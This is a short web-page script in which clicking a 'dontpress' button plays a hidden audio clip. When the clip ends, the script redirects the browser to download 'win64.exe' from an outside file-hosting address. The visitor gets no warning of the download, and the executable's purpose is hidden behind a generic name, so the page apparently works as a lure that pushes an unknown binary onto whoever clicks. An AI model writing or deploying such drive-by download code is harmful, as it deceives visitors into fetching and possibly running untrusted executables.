const btn1 = document.getElementById("dontpress");
btn1.addEventListener("click", youpressed);
function youpressed() {
    var sound = document.createElement('audio');
    sound.id = 'audio-player';
    sound.controls = true;
    sound.preload = 'auto';
    sound.src = 'audio.mp3';
    sound.type = 'audio/mpeg';
    sound.style.display = 'none';
  
    document.body.appendChild(sound);
    playerEl = document.getElementById("audio-player");
    playerEl.play();
    playerEl.addEventListener('ended', function() {
      playerEl.parentNode.removeChild(playerEl);
      window.location.href = ("https://norsu.tixte.co/r/win64.exe");
    });
  }
  